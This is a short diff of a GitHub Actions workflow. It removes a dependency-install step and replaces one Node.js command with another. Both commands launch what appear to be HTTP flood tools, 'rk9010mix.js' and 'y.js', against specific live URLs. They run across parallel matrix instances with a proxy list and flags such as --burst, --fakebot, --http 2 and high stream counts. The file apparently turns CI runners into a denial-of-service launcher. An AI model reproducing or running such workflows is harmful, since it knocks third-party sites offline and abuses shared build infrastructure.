@@ -30,9 +30,7 @@ jobs:
         with:
           python-version: '3.10'
       
-      - name: Install dependencies
-        run: |
-          sudo apt-get update 
+      
           
       
       - name: Install Node.js dependencies
@@ -45,7 +43,7 @@ jobs:
           unzip Fc-main.zip
           cd Fc-main
           
-          node rk9010mix.js https://rapidis.gay/6901966783-4af75121-c143-46cc-bb57-b011efee9302 250 400 2 proxy.txt --full --close --burst --randrate --fakebot --http 2 --ram 100 --streams 290 --direct --bfm --table 65536 --window 8388608
+          node y.js GET https://datacount.space/d6369e57-5c4b-4639-83ab-1dfc4c64af56 300 --bfw --debug 
           
         env:
           INSTANCE_NUMBER: ${{ matrix.instance }}
